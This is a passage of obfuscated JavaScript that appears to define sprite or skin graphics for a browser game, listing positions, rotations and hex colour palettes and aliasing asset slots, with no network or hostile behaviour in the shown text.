				f: ᐃΔᐃᐃΔⲆΔⲆᐃ,
				x: 0,
				y: Δᐃᐃⵠ,
				a: ᐃΔᐃⲆ,
				r: Math.PI / ΔΔᐃⲆ,
				c: [ⵠ[504], ⵠ[323], ⵠ[100], ⵠ[474], ⵠ[472], ⵠ[523], ⵠ[129]]
			}], .18, [ⵠ[350], ⵠ[350], ⵠ[350]], .5);
			ⵠⲆ[Ⲇ.ⵠΔⵠⵠⵠⲆᐃ] = ⵠⲆ[Ⲇ.ΔⲆⲆᐃᐃᐃΔ];
			ⵠⲆ[Ⲇ.ⲆⲆᐃΔⵠΔⲆ] = ⵠⲆ[Ⲇ.ⵠᐃⵠᐃⵠᐃᐃ];
			ⵠⲆ[Ⲇ.ⵠⲆⵠⵠΔⵠⵠ] = ᐃⲆⲆᐃ(ΔΔᐃⵠ, [{
				f: ΔᐃⵠⲆᐃᐃⲆΔΔ,
				x: ΔⲆⲆ,
				y: 0,
				a: 1,
				r: 0,
				c: ["#eedacc", "#dfbda7", "#dab094", "#63391a", "#523124"]
			}], .3, [ⵠ[358], ⵠ[86], ⵠ[468]], .5);
			ⵠⲆ[Ⲇ.ⲆΔⵠΔⵠᐃⵠ] = ⵠⲆ[Ⲇ.ⵠⲆⵠⵠΔⵠⵠ];
			ⵠⲆ[Ⲇ.ⲆⲆⵠⲆⲆᐃΔ] = ᐃⲆⲆᐃ(ΔⵠⲆΔ, [{
				f: ⲆⲆᐃᐃΔΔⲆⲆΔ,
				x: ⲆΔⵠ,
				y: ΔⲆⲆ,
				a: ⵠⲆΔ,
				r: 0,
				c: ["#1a1011", "#e29c2b", "#b76413", "#d6c418", "#e0bf32", "#b78a1a", "#aa1a17", "#cc9f2f", "#cc741d", "#b51524", "#bc1522", "#991922", "#a01ed5", "#d51e81"]
			}], .3, [ⵠ[358], ⵠ[86], ⵠ[468]], .5);
			ⵠⲆ[Ⲇ.ᐃⵠΔΔⲆΔⵠ] = ᐃⲆⲆᐃ(ⵠΔⲆ, [{
				f: ⲆⲆⲆᐃᐃΔⵠⵠᐃ,
				x: ⵠⲆⲆ,
				y: Δⵠᐃ,
				a: ΔⵠⲆΔ,
				r: 0,
				c: ["#1a1011", "#693c2a", "#54311f", "#9f7a3d", "#492d1d", "#dbb175", "#54311f", "#9f7a3d", "#604720"]
			}], .6, [ⵠ[358], ⵠ[86], ⵠ[468]], .5);
			ⵠⲆ[Ⲇ.ΔⵠΔΔᐃⲆΔ] = ᐃⲆⲆᐃ(Ⲇᐃⵠ, [{
				f: ΔⵠΔⲆΔΔⲆ,
				x: Ⲇᐃᐃᐃ,
				y: -ⵠΔᐃᐃⵠ,
				a: ⲆⵠⲆⲆ,
				r: 0,
				c: [ⵠ[341], "#bf8d51", "#7d5133", "#e8d6bf", "#e0c8a9", "#ab7a3f"]
			}], .17, [ⵠ[358], ⵠ[86], ⵠ[468]], .5);
			ⵠⲆ[Ⲇ.ΔⲆΔⵠⲆΔᐃ] = ⵠⲆ[Ⲇ.ΔⵠΔΔᐃⲆΔ];
			ⵠⲆ[Ⲇ.ⵠΔⲆⲆⵠⲆᐃ] = ᐃⲆⲆᐃ(ΔⵠΔⵠ, [{
				f: ᐃⵠΔᐃⲆⲆⵠΔⵠ,
				x: -3,
				y: -ᐃᐃⲆᐃ,
				a: 1,
				r: 0,
				c: [ⵠ[341], "#63767c", "#424f51", "#6c8288", "#536468", "#202020", ⵠ[407], "#806f60", "#514942", "#756557"]
			}], .23, [ⵠ[358], ⵠ[86], ⵠ[468]], .5);
			ⵠⲆ[Ⲇ.ⲆⵠⵠΔΔⵠΔ] = ᐃⲆⲆᐃ(ΔᐃⲆⵠ, [{
				f: ΔⵠᐃⲆⵠⲆⲆᐃⵠ,
				x: ΔᐃΔΔ,
				y: 0,
				a: 1,
				r: ᐃⵠⲆ,
				c: [ⵠ[341], "#42261A", "#281818"]
			}], .23, [ⵠ[358], ⵠ[86], ⵠ[468]], .5);
			ⵠⲆ[Ⲇ.ᐃⵠᐃⲆᐃΔⲆ] = ⵠⲆ[Ⲇ.ⲆⵠⵠΔΔⵠΔ];
			ⵠⲆ[Ⲇ.ⵠᐃⵠⲆⲆⲆᐃ] = ᐃⲆⲆᐃ(ⲆⵠⲆⲆ, [{
				f: ΔⵠⵠⲆᐃᐃⵠ,
				x: -3,
				y: 0,
				a: 1,
				r: ⲆⲆⲆᐃ,
				c: [ⵠ[187], "#65A8B7", ⵠ[361], "#14275B", "#081826", "#1A3163", "#0C1944", "#89C4CE", ⵠ[361]]
			}], .2, [ⵠ[113], ⵠ[392], ⵠ[444]], .5);
			ⵠⲆ[Ⲇ.ⵠΔⵠΔⵠΔⲆ] = ⵠⲆ[Ⲇ.ⵠᐃⵠⲆⲆⲆᐃ];
			ⵠⲆ[Ⲇ.ⲆⲆⲆᐃᐃΔΔ] = ᐃⲆⲆᐃ(1, [{
				f: ΔΔᐃⲆⵠⲆⲆΔΔ,
				x: ΔΔⵠ,
				y: 0,
				a: ΔΔᐃⵠ,
				r: 0,
				c: [ⵠ[187], "#961B1B", "#702727", "#C43B3B"]
			}], .15, [ⵠ[350], ⵠ[350], ⵠ[350]], .5);
			ⵠⲆ[Ⲇ.ᐃⵠⵠΔΔⵠΔ] = ᐃⲆⲆᐃ(ⵠᐃⵠΔ, [{
				f: ΔⲆⵠⵠᐃΔⵠ,
				x: 0,
				y: Ⲇᐃⵠⵠ,
				a: 1,
				r: 0,
				c: ["#F0D200", "#B09A00", "#79359E", "#652D8E", ⵠ[187]]
			}], .3, [ⵠ[113], ⵠ[392], ⵠ[444]], .5);
			ⵠⲆ[Ⲇ.ΔᐃⲆⵠΔⵠᐃ] = ⵠⲆ[Ⲇ.ᐃⵠⵠΔΔⵠΔ];
			ⵠⲆ[Ⲇ.ᐃⲆᐃᐃⲆⵠᐃ] = ᐃⲆⲆᐃ(1, [{
				f: ⵠΔΔⵠΔᐃⲆ,
				x: 0,
				y: ᐃⵠⲆ,
				a: 1,
				r: 0,
				c: [ⵠ[187], "#352E1E", ⵠ[371], ⵠ[261]]
			}], .3, [ⵠ[358], ⵠ[86], ⵠ[468]], .5);
			ⵠⲆ[Ⲇ.ᐃΔⵠⵠⲆᐃΔ] = ⵠⲆ[Ⲇ.ᐃⲆᐃᐃⲆⵠᐃ];
			ⵠⲆ[Ⲇ.ⵠᐃᐃⵠᐃⵠΔ] = ᐃⲆⲆᐃ(1, [{
				f: ⲆⲆⵠⵠⲆⲆΔᐃΔ,
				x: -5,
				y: -ΔⵠⲆⲆ,
				a: ⵠΔᐃ,
				r: ΔᐃΔΔ,
				c: ["#e2d63b", "#ee71a9", "#42b672"]
			}], ΔⲆⵠ, [ⵠ[358], ⵠ[86], ⵠ[468]], .5);
			ⵠⲆ[Ⲇ.ᐃᐃⲆᐃΔᐃᐃ] = ⵠⲆ[Ⲇ.ⵠᐃᐃⵠᐃⵠΔ];
			ⵠⲆ[Ⲇ.ⵠᐃΔᐃⵠᐃⵠ] = ᐃⲆⲆᐃ(1, [{
				f: ΔᐃⵠⵠⵠΔᐃ,
				x: 0,
				y: ᐃⵠⲆⵠ,
				a: ⵠⲆΔ,
				r: Δᐃᐃⵠ,
				c: [ⵠ[187], "#332715", ⵠ[371], ⵠ[261]]
			}], .5, [ⵠ[358], ⵠ[86], ⵠ[468]], .5);
			ⵠⲆ[Ⲇ.ΔⲆΔⲆⲆⵠⵠ] = ⵠⲆ[Ⲇ.ⵠᐃΔᐃⵠᐃⵠ];
			ⵠⲆ[Ⲇ.ᐃⲆΔᐃΔΔⵠ] = ᐃⲆⲆᐃ(1, [{
				f: ᐃΔⲆᐃΔⵠᐃ,
				x: ⵠΔⲆⵠ,
				y: 0,
				a: ᐃΔᐃⲆ,
				r: ⲆⲆⲆᐃ,
				c: [ⵠ[187], "#352618", "#402b18", ⵠ[80], ⵠ[261], "#52391e"]
			}], .3, [ⵠ[358], ⵠ[86], ⵠ[468]], .5);
			ⵠⲆ[Ⲇ.ⲆⲆⲆⵠⵠⵠΔ] = ⵠⲆ[Ⲇ.ᐃⲆΔᐃΔΔⵠ];
			ⵠⲆ[Ⲇ.ᐃᐃΔᐃⵠⲆᐃ] = ᐃⲆⲆᐃ(1, [{
				f: ⲆⵠΔⲆⵠΔΔ,
				x: -ᐃᐃⵠ,
				y: ᐃⵠⲆ,
				a: 1,
				r: -Math.PI / 5,
				c: [ⵠ[187], ⵠ[495], ⵠ[371], "#594225", ⵠ[154]]
			}], .4, [ⵠ[113], ⵠ[392], ⵠ[444]], .7);
			ⵠⲆ[Ⲇ.ΔΔⵠⲆⲆᐃⲆ] = ⵠⲆ[Ⲇ.ᐃᐃΔᐃⵠⲆᐃ];
			ⵠⲆ[Ⲇ.ⵠⲆᐃΔΔⵠΔ] = ᐃⲆⲆᐃ(1, [{
				f: ⲆⵠΔⲆⵠΔΔ,
				x: -ΔⵠΔⵠ,
				y: 0,
				a: 1,
				r: -Math.PI / ᐃΔΔⲆ,
				c: [ⵠ[187], ⵠ[495], ⵠ[371], "#594225", "#3F2D18", "#2D2112"]
			}], .4, [ⵠ[350], ⵠ[350], ⵠ[350]], .5);
			ⵠⲆ[Ⲇ.ⲆⲆⲆᐃᐃⵠᐃ] = ⵠⲆ[Ⲇ.ⵠⲆᐃΔΔⵠΔ];
			ⵠⲆ[Ⲇ.ᐃΔᐃΔⵠᐃⵠ] = ᐃⲆⲆᐃ(1, [{
				f: ⲆᐃΔⵠΔᐃΔ,
				x: Ⲇᐃⵠⵠ,
				y: 0,
				a: ⲆⵠⲆⲆ,
				r: 0,
				c: ["#B3AA8E", "#817961", "#EBEAE2", "#E0DFD8"]
			}], .25, [ⵠ[350], ⵠ[350], ⵠ[350]], .5);
			ⵠⲆ[Ⲇ.ᐃⵠⲆΔΔⲆᐃ] = ᐃⲆⲆᐃ(1, [{
				f: ᐃⵠⲆᐃᐃⲆⵠ,
				x: 0,
				y: ⲆΔⵠ,
				a: ΔΔᐃⵠ,
				r: ⵠΔⲆⵠ,
				c: [ⵠ[187], "#ed5f4f", "#ce4545", ⵠ[407], "#e2dad7"]
			}], .2, [ⵠ[358], ⵠ[86], ⵠ[468]], .5);
			ⵠⲆ[Ⲇ.ⵠⵠⵠⲆⲆᐃⵠ] = ⵠⲆ[Ⲇ.ᐃⵠⲆΔΔⲆᐃ];
			ⵠⲆ[Ⲇ.ⵠⵠⲆᐃΔΔΔ] = ᐃⲆⲆᐃ(ΔᐃᐃⲆ, [{
				f: ⲆⲆⵠⵠΔΔΔΔΔ,
				x: 0,
				y: Ⲇᐃᐃᐃ,
				a: 1,
				r: 0,
				c: [ⵠ[187], "#63391a", "#523124", "#d2c4b9", "#c1aca2", "#d8cbc2", "#c8b5ac", ⵠ[223], ⵠ[374]]
			}], .25, [ⵠ[358], ⵠ[86], ⵠ[468]], .5);
			ⵠⲆ[Ⲇ.ⵠᐃⵠΔΔΔΔ] = ⵠⲆ[Ⲇ.ⵠⵠⲆᐃΔΔΔ];
			ⵠⲆ[Ⲇ.ΔⲆᐃΔᐃᐃⲆ] = ᐃⲆⲆᐃ(1, [{
				f: ⲆⲆᐃΔⲆΔΔⵠᐃ,
				x: -2,
				y: -Δᐃⵠⵠⵠ,
				a: ΔⵠΔⵠ,
				r: 0,
				c: ["#dfd6bc", "#7b5139", "#bf8d50", "#834e49", "#602820", "#d7ccaa"]
			}], .25, [ⵠ[358], ⵠ[86], ⵠ[468]], .5);
			ⵠⲆ[Ⲇ.ΔⲆᐃᐃⵠΔΔ] = ⵠⲆ[Ⲇ.ΔⲆᐃΔᐃᐃⲆ];
			ⵠⲆ[Ⲇ.ᐃⲆΔⵠⲆⵠᐃ] = [];
			ⵠⲆ[Ⲇ.ᐃⲆΔⵠⲆⵠᐃ][Ⲇᐃⵠⵠ] = ⲆΔ.ᐃⵠⵠΔⵠΔᐃ;
			ⵠⲆ[Ⲇ.ᐃⲆΔⵠⲆⵠᐃ][ΔⵠΔⵠ] = ⲆΔ.ΔⵠΔΔΔΔⵠ;
			ⵠⲆ[Ⲇ.ᐃⲆΔⵠⲆⵠᐃ][2] = ⲆΔ.ΔΔⵠΔⲆᐃⵠ;
			ⵠⲆ[Ⲇ.ΔⵠΔⲆᐃᐃⵠ] = ⵠⲆ[Ⲇ.ᐃⲆΔⵠⲆⵠᐃ];
			ⵠⲆ[Ⲇ.ⵠⵠᐃΔΔΔⲆ] = ⵠⲆ[Ⲇ.ᐃⲆΔⵠⲆⵠᐃ];
			ⵠⲆ[Ⲇ.ⲆⲆᐃⵠⲆᐃᐃ] = [];
			ⵠⲆ[Ⲇ.ⲆⲆᐃⵠⲆᐃᐃ][0] = ⲆΔ.ⲆⵠⲆⲆⵠΔΔ;
			ⵠⲆ[Ⲇ.ⲆⲆᐃⵠⲆᐃᐃ][1] = ⲆΔ.ΔⵠⵠᐃⲆᐃᐃ;
			ⵠⲆ[Ⲇ.ⲆⲆᐃⵠⲆᐃᐃ][Δᐃⵠⵠ] = ⲆΔ.ᐃᐃᐃⵠⵠᐃΔ;
			ⵠⲆ[Ⲇ.ΔΔⵠⵠᐃⲆⲆ] = ⵠⲆ[Ⲇ.ⲆⲆᐃⵠⲆᐃᐃ];
			ⵠⲆ[Ⲇ.ⲆⲆᐃΔⲆⵠᐃ] = ⵠⲆ[Ⲇ.ⲆⲆᐃⵠⲆᐃᐃ];
			ⵠⲆ[Ⲇ.ⵠⲆᐃⲆᐃⵠⵠ] = ⵠⲆ[Ⲇ.ⲆᐃΔⲆᐃΔⲆ];
			ⵠⲆ[Ⲇ.ΔΔᐃᐃΔᐃⵠ] = ⵠⲆ[Ⲇ.ⲆᐃΔⲆᐃΔⲆ];
			ⵠⲆ[Ⲇ.ⲆᐃΔⲆᐃΔⲆ] = [];
			ⵠⲆ[Ⲇ.ⲆᐃΔⲆᐃΔⲆ][ΔΔⵠ] = ⲆΔ.ⵠᐃⲆⵠⵠΔⵠ;
			ⵠⲆ[Ⲇ.ⲆᐃΔⲆᐃΔⲆ][1] = ⲆΔ.ⲆΔⲆⲆⲆⵠᐃ;
			ⵠⲆ[Ⲇ.ⲆᐃΔⲆᐃΔⲆ][2] = ⲆΔ.ⵠⵠⵠⵠⲆΔⵠ;
			ⵠⲆ[Ⲇ.ⵠⲆᐃⲆᐃⵠⵠ] = ⵠⲆ[Ⲇ.ⲆᐃΔⲆᐃΔⲆ];
			ⵠⲆ[Ⲇ.ΔΔᐃᐃΔᐃⵠ] = ⵠⲆ[Ⲇ.ⲆᐃΔⲆᐃΔⲆ];
			ⵠⲆ[Ⲇ.ⵠᐃⲆⲆΔΔⵠ] = [];
			ⵠⲆ[Ⲇ.ⵠᐃⲆⲆΔΔⵠ][0] = ⲆΔ.ⵠⲆⲆⵠΔᐃᐃ;
			ⵠⲆ[Ⲇ.ⵠᐃⲆⲆΔΔⵠ][ᐃⲆᐃ] = ⲆΔ.ⵠⲆΔᐃᐃⲆⵠ;
			ⵠⲆ[Ⲇ.ⵠᐃⲆⲆΔΔⵠ][2] = ⲆΔ.ⵠΔᐃΔⵠⲆΔ;
			ⵠⲆ[Ⲇ.ⲆⲆⵠΔᐃⵠⵠ] = ⵠⲆ[Ⲇ.ⵠᐃⲆⲆΔΔⵠ];
			ⵠⲆ[Ⲇ.ΔⲆᐃΔΔᐃⵠ] = ⵠⲆ[Ⲇ.ⵠᐃⲆⲆΔΔⵠ];
			ⵠⲆ[Ⲇ.ΔΔⲆᐃΔⵠᐃ] = [];
			ⵠⲆ[Ⲇ.ΔΔⲆᐃΔⵠᐃ][ⵠᐃⲆᐃ] = ⲆΔ.ᐃⵠⲆΔΔⵠᐃ;
			ⵠⲆ[Ⲇ.ΔΔⲆᐃΔⵠᐃ][1] = ⲆΔ.ⲆᐃᐃΔᐃΔⵠ;
			ⵠⲆ[Ⲇ.ΔΔⲆᐃΔⵠᐃ][ⵠⵠⵠΔ] = ⲆΔ.ⵠⵠⵠⲆΔⲆᐃ;
			ⵠⲆ[Ⲇ.ⲆⲆⲆΔⵠΔⲆ] = ⵠⲆ[Ⲇ.ΔΔⲆᐃΔⵠᐃ];
			ⵠⲆ[Ⲇ.ⵠΔᐃΔⲆⲆⲆ] = ⵠⲆ[Ⲇ.ΔΔⲆᐃΔⵠᐃ];
			ⵠⲆ[Ⲇ.ⲆⵠⵠᐃᐃΔΔ] = [];
			ⵠⲆ[Ⲇ.ⲆⵠⵠᐃᐃΔΔ][ⵠΔⲆⵠ] = ⲆΔ.ⵠΔΔⵠⲆΔⲆ;
			ⵠⲆ[Ⲇ.ⲆⵠⵠᐃᐃΔΔ][ΔⵠⲆΔ] = ⲆΔ.ᐃΔΔᐃⵠⵠΔ;
			ⵠⲆ[Ⲇ.ⲆⵠⵠᐃᐃΔΔ][ⲆΔΔⵠ] = ⲆΔ.ⲆΔΔⲆᐃᐃᐃ;
			ⵠⲆ[Ⲇ.ᐃⵠᐃΔⲆΔⲆ] = ⵠⲆ[Ⲇ.ⲆⵠⵠᐃᐃΔΔ];
			ⵠⲆ[Ⲇ.ᐃⵠΔⵠᐃⲆᐃ] = ⵠⲆ[Ⲇ.ⲆⵠⵠᐃᐃΔΔ];
			ⵠⲆ[Ⲇ.ΔᐃΔⲆⵠᐃⲆ] = [];
			ⵠⲆ[Ⲇ.ΔᐃΔⲆⵠᐃⲆ][ᐃⵠⲆ] = ⲆΔ.ᐃⵠΔⵠⵠᐃᐃ;
			ⵠⲆ[Ⲇ.ΔᐃΔⲆⵠᐃⲆ][Ⲇᐃⵠ] = ⲆΔ.ᐃⲆᐃⲆΔⵠᐃ;
			ⵠⲆ[Ⲇ.ΔᐃΔⲆⵠᐃⲆ][ⵠⵠΔⲆ] = ⲆΔ.ᐃᐃΔᐃⵠᐃᐃ;
			ⵠⲆ[Ⲇ.ᐃΔᐃⲆΔᐃᐃ] = ⵠⲆ[Ⲇ.ΔᐃΔⲆⵠᐃⲆ];
			ⵠⲆ[Ⲇ.ΔⵠΔⵠⲆⲆⵠ] = ⵠⲆ[Ⲇ.ΔᐃΔⲆⵠᐃⲆ];
			ⵠⲆ[Ⲇ.ⵠΔⵠᐃΔΔᐃ] = [];
			ⵠⲆ[Ⲇ.ⵠΔⵠᐃΔΔᐃ][ΔⲆⲆ] = ⲆΔ.ΔᐃⲆΔΔⲆΔ;
			ⵠⲆ[Ⲇ.ⵠΔⵠᐃΔΔᐃ][ᐃᐃⲆΔ] = ⲆΔ.ΔⵠⵠⵠⵠⲆⲆ;
			ⵠⲆ[Ⲇ.ⵠΔⵠᐃΔΔᐃ][2] = ⲆΔ.ⵠᐃⲆⵠᐃᐃΔ;
			ⵠⲆ[Ⲇ.ⲆⲆᐃΔΔⲆⵠ] = ⵠⲆ[Ⲇ.ⵠΔⵠᐃΔΔᐃ];
			ⵠⲆ[Ⲇ.ⲆᐃΔᐃⵠᐃⲆ] = ⵠⲆ[Ⲇ.ⵠΔⵠᐃΔΔᐃ];
			ⵠⲆ[Ⲇ.ⲆᐃⵠΔⵠⲆᐃ] = [];
			ⵠⲆ[Ⲇ.ⲆᐃⵠΔⵠⲆᐃ][Ⲇᐃᐃᐃ] = ⲆΔ.ΔⲆⵠⲆⵠⲆΔ;
			ⵠⲆ[Ⲇ.ⲆᐃⵠΔⵠⲆᐃ][ⵠΔⵠΔ] = ⲆΔ.ⲆⵠᐃᐃⵠΔⵠ;
			ⵠⲆ[Ⲇ.ⲆᐃⵠΔⵠⲆᐃ][2] = ⲆΔ.ΔⲆΔⵠⵠᐃⵠ;
			ⵠⲆ[Ⲇ.ⵠⵠΔⲆΔⵠⲆ] = ⵠⲆ[Ⲇ.ⲆᐃⵠΔⵠⲆᐃ];
			ⵠⲆ[Ⲇ.ⲆⲆᐃᐃΔᐃΔ] = ⵠⲆ[Ⲇ.ⲆᐃⵠΔⵠⲆᐃ];
			ⵠⲆ[Ⲇ.ΔⵠᐃΔᐃⲆⵠ] = [];
			ⵠⲆ[Ⲇ.ΔⵠᐃΔᐃⲆⵠ][0] = ⲆΔ.ᐃⲆⲆⵠⲆⲆᐃ;
			ⵠⲆ[Ⲇ.ΔⵠᐃΔᐃⲆⵠ][1] = ⲆΔ.ᐃΔΔΔⲆΔⵠ;
			ⵠⲆ[Ⲇ.ΔⵠᐃΔᐃⲆⵠ][2] = ⲆΔ.ⵠΔⲆⵠᐃΔᐃ;
			ⵠⲆ[Ⲇ.ΔΔΔⵠⵠᐃᐃᐃᐃ] = ⵠⲆ[Ⲇ.ΔⵠᐃΔᐃⲆⵠ];
			ⵠⲆ[Ⲇ.ᐃⵠΔⵠⲆΔⵠ] = ⵠⲆ[Ⲇ.ΔⵠᐃΔᐃⲆⵠ];
			ⵠⲆ[Ⲇ.ⲆⵠΔⵠᐃⲆⵠ] = [];
			ⵠⲆ[Ⲇ.ⲆⵠΔⵠᐃⲆⵠ][0] = ⲆΔ.ᐃⲆⲆΔⲆⵠᐃ;
			ⵠⲆ[Ⲇ.ⲆⵠΔⵠᐃⲆⵠ][1] = ⲆΔ.ᐃΔᐃᐃⵠᐃⵠ;
			ⵠⲆ[Ⲇ.ⲆⵠΔⵠᐃⲆⵠ][Δᐃⵠⵠ] = ⲆΔ.ⲆⲆⲆΔⲆⵠⵠ;
			ⵠⲆ[Ⲇ.ᐃⲆᐃⵠᐃΔⵠ] = ⵠⲆ[Ⲇ.ⲆⵠΔⵠᐃⲆⵠ];
			ⵠⲆ[Ⲇ.ⵠⲆⵠᐃᐃᐃⲆ] = ⵠⲆ[Ⲇ.ⲆⵠΔⵠᐃⲆⵠ];
			ⵠⲆ[Ⲇ.ⵠⲆΔⵠⵠⵠⵠ] = [];
			ⵠⲆ[Ⲇ.ⵠⲆΔⵠⵠⵠⵠ][0] = ⲆΔ.ᐃⵠⲆⲆⵠΔᐃ;
			ⵠⲆ[Ⲇ.ⵠⲆΔⵠⵠⵠⵠ][ⲆⵠⲆⲆ] = ⲆΔ.ⵠⲆⵠⲆⲆΔᐃ;
			ⵠⲆ[Ⲇ.ⵠⲆΔⵠⵠⵠⵠ][ⲆΔΔⵠ] = ⲆΔ.ⵠⲆᐃⲆⲆᐃⲆ;
			ⵠⲆ[Ⲇ.ⲆΔΔⵠⵠΔⵠ] = ⵠⲆ[Ⲇ.ⵠⲆΔⵠⵠⵠⵠ];
			ⵠⲆ[Ⲇ.ⵠⵠΔⲆⵠⵠⲆ] = ⵠⲆ[Ⲇ.ⵠⲆΔⵠⵠⵠⵠ];
			ⵠⲆ[Ⲇ.ⲆⵠⲆⲆᐃⵠⲆ] = [];
			ⵠⲆ[Ⲇ.ⲆⵠⲆⲆᐃⵠⲆ][0] = ⲆΔ.ⵠᐃⵠᐃⲆⵠⲆ;
			ⵠⲆ[Ⲇ.ⲆⵠⲆⲆᐃⵠⲆ][ΔᐃᐃⲆ] = ⲆΔ.ⵠΔᐃΔⲆⵠⲆ;
			ⵠⲆ[Ⲇ.ⲆⵠⲆⲆᐃⵠⲆ][2] = ⲆΔ.ⲆᐃΔⲆΔⲆΔ;
			ⵠⲆ[Ⲇ.ΔⵠⲆⵠᐃᐃⲆ] = ⵠⲆ[Ⲇ.ⲆⵠⲆⲆᐃⵠⲆ];
			ⵠⲆ[Ⲇ.ΔⲆᐃⵠᐃᐃⲆ] = [];
			ⵠⲆ[Ⲇ.ΔⲆᐃⵠᐃᐃⲆ][Δⵠᐃ] = ⲆΔ.ᐃⲆᐃⲆⲆΔⵠ;
			ⵠⲆ[Ⲇ.ΔⲆᐃⵠᐃᐃⲆ][1] = ⲆΔ.ⵠⵠⲆᐃᐃⵠⲆ;
			ⵠⲆ[Ⲇ.ΔⲆᐃⵠᐃᐃⲆ][2] = ⲆΔ.ᐃⵠΔΔΔⵠⲆ;
			ⵠⲆ[Ⲇ.ⲆᐃⵠᐃⵠⲆⲆ] = ⵠⲆ[Ⲇ.ΔⲆᐃⵠᐃᐃⲆ];
			ⵠⲆ[Ⲇ.ⵠⵠⲆⵠᐃⵠᐃ] = ⵠⲆ[Ⲇ.ᐃⲆΔⲆᐃⵠⵠ];
			ⵠⲆ[Ⲇ.ⲆΔΔⲆΔᐃⲆ] = ⵠⲆ[Ⲇ.ᐃᐃΔⵠⲆⵠⵠ];
			ⵠⲆ[Ⲇ.ᐃⵠⲆΔᐃⲆⵠ] = ⵠⲆ[Ⲇ.ΔⲆⲆⲆᐃᐃΔ];
			ⵠⲆ[Ⲇ.ⵠᐃⲆΔΔⵠⲆ] = ⵠⲆ[Ⲇ.ΔΔⵠⲆⲆⲆΔ];
			ⵠⲆ[Ⲇ.ΔΔⲆⲆⲆᐃⲆ] = ⵠⲆ[Ⲇ.ᐃΔⵠᐃⵠᐃᐃ];
			ⵠⲆ[Ⲇ.ΔⲆⲆⲆⲆᐃΔ] = ⵠⲆ[Ⲇ.ⲆᐃΔΔΔⵠΔ];
			ⵠⲆ[Ⲇ.ⲆΔΔΔΔΔⲆ] = ⵠⲆ[Ⲇ.ΔⵠᐃⲆΔᐃⵠ];
			ⵠⲆ[Ⲇ.ΔⲆⲆⵠⲆⲆΔ] = ⵠⲆ[Ⲇ.ⵠⲆΔᐃⲆⲆᐃ];
			ⵠⲆ[Ⲇ.ΔⵠᐃⵠⲆⵠΔ] = ⵠⲆ[Ⲇ.ⵠⵠΔᐃΔⲆⲆ];
			ⵠⲆ[Ⲇ.ⵠᐃᐃΔⵠⵠⵠ] = ⵠⲆ[Ⲇ.ΔⲆΔⲆⵠⵠΔ];
			ⵠⲆ[Ⲇ.ⵠᐃⵠΔᐃᐃᐃ] = ⵠⲆ[Ⲇ.ᐃΔⲆⲆⲆⲆⲆ];
			ⵠⲆ[Ⲇ.ᐃᐃᐃᐃⲆⵠᐃ] = ⵠⲆ[Ⲇ.ⲆⵠⲆΔΔⲆⵠ];
			ⵠⲆ[Ⲇ.ΔⲆⲆΔᐃⵠⵠ] = ⵠⲆ[Ⲇ.ⵠⵠΔⵠΔⲆᐃ];
			ⵠⲆ[Ⲇ.ᐃⵠΔᐃΔΔᐃ] = ⵠⲆ[Ⲇ.ᐃⵠᐃᐃⲆᐃⵠ];
			ⵠⲆ[Ⲇ.ΔⲆⲆᐃΔⵠⲆ] = ⵠⲆ[Ⲇ.ⵠΔⲆⲆⵠᐃΔ];
			ⵠⲆ[Ⲇ.ᐃⵠⲆⵠΔΔⲆ] = ⵠⲆ[Ⲇ.ΔΔⲆⵠΔⵠⵠ];
			ⵠⲆ[Ⲇ.ᐃΔΔᐃⵠⵠᐃ] = ⵠⲆ[Ⲇ.ᐃⲆⵠⲆⵠⲆΔ];
			ⵠⲆ[Ⲇ.ᐃΔᐃⵠΔΔⵠ] = ⵠⲆ[Ⲇ.ⵠⵠΔᐃᐃᐃⵠ];
			ⵠⲆ[Ⲇ.ᐃⲆⲆⵠⲆᐃᐃ] = ⵠⲆ[Ⲇ.ᐃΔΔⵠᐃΔΔ];
			ⵠⲆ[Ⲇ.ᐃᐃΔᐃΔⵠⵠ] = ⵠⲆ[Ⲇ.ΔⲆᐃⵠⵠΔᐃ];
			ⵠⲆ[Ⲇ.ⲆⲆⲆᐃΔΔⲆ] = ⵠⲆ[Ⲇ.ΔΔⲆⵠⵠΔᐃ];
			ⵠⲆ[Ⲇ.ⵠᐃⲆⵠⲆⲆⵠ] = ⵠⲆ[Ⲇ.ΔⵠᐃᐃⲆᐃⲆ];
			ⵠⲆ[Ⲇ.ΔᐃΔⵠΔⵠᐃ] = ⵠⲆ[Ⲇ.ᐃⵠⵠΔⲆΔⲆ];
			ⵠⲆ[Ⲇ.ⵠΔⲆᐃⲆᐃⲆ] = ⵠⲆ[Ⲇ.ⵠᐃⵠΔΔⲆΔ];
			ⵠⲆ[Ⲇ.ⲆⵠᐃⵠΔⲆᐃ] = ⵠⲆ[Ⲇ.ⲆᐃⵠⵠⲆΔΔ];
			ⵠⲆ[Ⲇ.ⵠⵠᐃⲆⲆⲆΔ] = ⵠⲆ[Ⲇ.ⲆΔΔᐃⵠⲆⲆ];
			ⵠⲆ[Ⲇ.ᐃᐃΔΔⲆⲆⲆ] = ⵠⲆ[Ⲇ.ᐃⵠᐃᐃⵠⵠⵠ];
			ⵠⲆ[Ⲇ.ⲆΔⵠΔⲆΔΔ] = ⵠⲆ[Ⲇ.ΔΔᐃⲆΔΔᐃ];
			ⵠⲆ[Ⲇ.ⲆⵠΔⵠⲆᐃΔ] = ⵠⲆ[Ⲇ.ⵠΔΔᐃΔᐃΔ];
			ⵠⲆ[Ⲇ.ΔΔⵠᐃⵠⲆⲆ] = ⵠⲆ[Ⲇ.ᐃⵠⵠᐃⵠᐃⵠ];
			ⵠⲆ[Ⲇ.ⵠⵠⲆᐃΔⵠᐃ] = ⵠⲆ[Ⲇ.ⵠⵠⲆⲆⲆⵠⲆ];
			ⵠⲆ[Ⲇ.ΔΔⵠᐃᐃⵠᐃ] = ⵠⲆ[Ⲇ.ΔⲆⵠᐃΔⵠⵠ];
			ⵠⲆ[Ⲇ.ΔΔⲆⲆⲆⵠᐃ] = ⵠⲆ[Ⲇ.ΔⲆⵠⵠᐃⲆᐃ];
			ⵠⲆ[Ⲇ.ⲆⵠΔΔⲆᐃⵠ] = ⵠⲆ[Ⲇ.ᐃⵠΔᐃΔⵠⲆ];
			ⵠⲆ[Ⲇ.ΔⵠᐃⵠⵠΔΔ] = ⵠⲆ[Ⲇ.ΔⲆΔΔⵠⵠⵠ];
			ⵠⲆ[Ⲇ.ᐃᐃⵠⲆΔⲆᐃ] = ⵠⲆ[Ⲇ.ⵠⲆΔΔΔⵠⵠ];
			ⵠⲆ[Ⲇ.ᐃⵠⵠⵠᐃⲆⵠ] = ⵠⲆ[Ⲇ.ΔⲆᐃᐃⲆΔⵠ];
